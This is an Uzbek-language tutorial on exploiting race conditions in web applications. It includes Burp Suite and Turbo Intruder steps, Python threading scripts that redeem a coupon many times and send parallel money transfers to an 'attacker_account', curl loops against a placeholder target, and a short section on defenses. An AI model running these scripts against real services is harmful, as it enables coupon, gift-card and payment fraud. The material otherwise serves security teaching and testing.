# 🏁 Race Conditions (Poyga Holatlari)

> **Maqsad:** Bir vaqtda yuborilgan so'rovlar o'rtasidagi vaqt oralig'idagi zaiflikdan foydalanib, tizimdagi mantiqiy himoyani chetlab o'tish.

---

## 📖 Asosiy Tushunchalar

### Race Condition nima?
Dastur bir vaqtda kelgan bir nechta so'rovni to'g'ri tartibda bajara olmasa paydo bo'ladigan zaiflik.

**Oddiy hayotiy misol:**
> Bank hisobingizda 100$ bor. Siz bir vaqtda ikkita ATM dan 100$ so'raysiz.
> Ikkala ATM ham "100$ bor" deb tekshiradi → ikkala ATM ham 100$ beradi → 200$ oldingiz!

### Texnik tushuntirish:
```
Normal (ketma-ket):
So'rov 1: Tekshir → O'zgartir → Saqlash   ✅
So'rov 2: Tekshir → O'zgartir → Saqlashing ✅

Race Condition (bir vaqtda):
So'rov 1: Tekshir ──────────────→ O'zgartir → Saqlash
So'rov 2:          Tekshir ──────────────────→ Saqlash
                     ↑
               Ikkalasi ham "OK" dedi, chunki birinchi hali saqlamagan!
```

### TOCTOU nima?
**Time Of Check To Time Of Use** — tekshirish va ishlatish orasidagi vaqt oralig'i.

```
1. CHECK (Tekshirish): "Kupon ishlatilganmi?" → "Yo'q" ✅
   ... [zaif vaqt oralig'i] ...
2. USE (Ishlatish): Kuponni tatbiq et
3. MARK (Belgilash): "Kupon ishlatildi" deb belgilashtirish

Agar 2 ta so'rov bir vaqtda kelsa:
- Ikkalasi ham 1-bosqichda "Yo'q" javobini oladi
- Ikkalasi ham kuponni ishlatadi!
```

---

## 🎯 Race Condition Qayerda Bo'ladi?

| Soha | Misol |
|------|-------|
| **Chegirma/Kupon** | Bir martalik kuponni ko'p marta ishlatish |
| **Pul o'tkazish** | Balansdagi pulni ko'p marta chiqarish |
| **Ovoz berish** | Bir marta ovoz berish limitini chetlab o'tish |
| **Ro'yxatdan o'tish** | Bir email bilan ikki akkaunt yaratish |
| **Fayl yuklash** | Antivirusdan oldin faylni ishlatish |
| **Gift card** | Bir gift cardni ko'p marta sarflash |
| **Like/Follow** | Limit limitni buzish |

---

## ⚡ Hujum Texnikasi: Parallel So'rovlar

### Maqsad: So'rovlarni aynan bir vaqtda yuborish

#### 1. Burp Suite Repeater (Parallel Tabs)
```
1. So'rovni Repeater ga yuboring (CTRL+R)
2. "+" bilan ko'p tab oching (masalan 20 ta)
3. Hamma tabga bir xil so'rov nusxa oling
4. CTRL+A → barcha tablarni tanlang
5. "Send group in parallel" tugmasini bosing
→ Hammasi bir vaqtda yuboriladi!
```

#### 2. Burp Suite Intruder (Parallel Attack)
```
1. So'rovni Intruder ga yuboring
2. Attack type: "Pitchfork" yoki "Sniper"
3. Payload: Null payloads → 20 ta
4. Resource pool: Max concurrent requests = 20
5. Start attack
```

#### 3. Python bilan (Threading — Ko'p ipli)
```python
import threading
import requests

url = "http://target.com/use-coupon"
headers = {"Cookie": "session=YOUR_SESSION"}
data = {"coupon_code": "DISCOUNT50"}

def send_request():
    response = requests.post(url, headers=headers, data=data)
    print(f"Status: {response.status_code} | Response: {response.text[:100]}")

# 20 ta so'rovni bir vaqtda yuborish
threads = []
for i in range(20):
    t = threading.Thread(target=send_request)
    threads.append(t)

# Barchasini bir vaqtda boshlash
for t in threads:
    t.start()

# Barchasini kutish
for t in threads:
    t.join()
```

#### 4. Turbo Intruder (Burp Extension) — Eng Aniq
```python
# Turbo Intruder skripti:
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=20,
                           requestsPerConnection=1,
                           pipeline=False)
    
    for i in range(20):
        engine.queue(target.req)

def handleResponse(req, interesting):
    table.add(req)
```

#### 5. curl bilan (Bash)
```bash
# & bilan background da parallel yuborish
for i in {1..20}; do
    curl -s -X POST "http://target.com/redeem" \
         -b "session=YOUR_SESSION" \
         -d "code=GIFT123" &
done
wait
```

---

## 🔍 Race Condition Topish

### Tekshirish kerak bo'lgan joy belgilari:
```
- "Kupon allaqachon ishlatilgan" xabari
- "Bir foydalanuvchi faqat bir marta" cheklovi
- "Balansingiz yetarli emas" tekshiruvi
- "Email allaqachon ro'yxatdan o'tgan"
- "Siz allaqachon ovoz bergansiz"
- "Limitga yetdingiz"
```

### Sinov usuli:
```
1. Amaliyotni bir marta bajaring → ishlashi kerak
2. Ikkinchi urinish → xato xabari kelishi kerak
3. Endi 2-bosqich so'rovini 20 ta parallel yuboring
4. Agar ba'zilari muvaffaqiyatli bo'lsa → Race Condition!
```

---

## 🧪 Amaliy Misol 1: Kupon Ko'p Marta Ishlatish

```python
import threading
import requests
import time

session = requests.Session()
session.cookies.set('session', 'YOUR_SESSION_TOKEN')

url = "http://target.com/apply-coupon"
success_count = 0
lock = threading.Lock()

def use_coupon():
    global success_count
    response = session.post(url, data={"coupon": "SAVE20"})
    
    if "discount applied" in response.text.lower():
        with lock:
            success_count += 1
        print(f"[+] Muvaffaqiyatli! {success_count}-marta")
    else:
        print(f"[-] Rad etildi: {response.text[:50]}")

# 30 ta thread bir vaqtda
threads = [threading.Thread(target=use_coupon) for _ in range(30)]

print("[*] Hujum boshlanmoqda...")
start = time.time()

for t in threads:
    t.start()
for t in threads:
    t.join()

print(f"\n[=] Natija: {success_count} marta muvaffaqiyatli ({time.time()-start:.2f}s)")
```

---

## 🧪 Amaliy Misol 2: Pul Transfer Race Condition

```python
import threading
import requests

# Ssenariy: Hisobda 100$ bor, 100$ ni ikki joyga o'tkazmizлейни

session = requests.Session()
session.cookies.set('session', 'YOUR_SESSION')

def transfer_money():
    response = session.post("http://target.com/transfer", 
                            data={"amount": 100, "to": "attacker_account"})
    print(response.text[:100])

# Bir vaqtda 2 ta transfer:
t1 = threading.Thread(target=transfer_money)
t2 = threading.Thread(target=transfer_money)

t1.start()
t2.start()
t1.join()
t2.join()
```

---

## ⏱️ Vaqt Oralig'ini Kattalashtirish (Amplification)

Ba'zan vaqt oralig'i juda qisqa bo'ladi. Uni kattalashtirish uchun:

```
1. HTTP/2 Single Packet Attack:
   - Burp Suite → HTTP/2 yoqing
   - Barcha so'rovlarni bitta TCP paketda yuboring
   - Tarmoq kechikishini yo'q qiladi!

2. Last-byte sync:
   - So'rovning ko'p qismini yuboring
   - Oxirgi baytni bir vaqtda yuboring
   - Serverdagi ishlov berish vaqti sinxronlashadi
```

---

## 🛡️ Himoya Usullari (Mudofaa uchun)

```
1. Database locks (Ma'lumotlar bazasi qulflari):
   - SELECT FOR UPDATE
   - SERIALIZABLE transaction
   
2. Atomik operatsiyalar:
   UPDATE balance SET amount = amount - 100 WHERE amount >= 100
   -- Bu bitta SQL buyruqda tekshirish va o'zgartirishni bajaradi

3. Redis locks:
   SET lock_key unique_value NX EX 10
   -- NX = faqat yo'q bo'lsa o'rnat
   -- EX 10 = 10 soniyadan keyin avtomatik o'chirish

4. Idempotency keys (Takrorlanmaslik kalitlari):
   Har bir so'rovga noyob kalit qo'shish
   Bir xil kalit ikki marta qabul qilinmaydi
```

---

## 💡 Eslab Qolish Uchun

| Tushuncha | Ma'nosi |
|-----------|---------|
| **Race Condition** | Bir vaqtda so'rovlar orasidagi zaiflik |
| **TOCTOU** | Tekshirish va ishlatish orasidagi vaqt oralig'i |
| **Thread** | Parallel bajariladigan vazifa (ip) |
| **Atomic** | Bo'linmas, bir vaqtda bajariladigan operatsiya |

**Tezkor test:**
```bash
# 20 ta parallel so'rov
for i in {1..20}; do
    curl -s -X POST http://target.com/action \
         -b "session=TOKEN" -d "data=value" &
done; wait
```

**Eng muhim narsalar:**
- Race Condition = **Vaqt** zaiflik — ikki so'rov orasidagi bo'shliq
- **Parallel** yuborish — threads, Turbo Intruder, `&` operator
- **TOCTOU** = Check → [zaif oraliq] → Use
- Burp Suite **"Send group in parallel"** — eng qulay usul
- Muvaffaqiyat belgisi: bir marta ishlashi kerak bo'lgan narsa ikki marta ishlaydi
